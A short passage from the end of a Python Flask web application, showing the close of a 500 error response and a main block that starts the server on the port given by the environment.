        }), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=False, host='0.0.0.0', port=port)
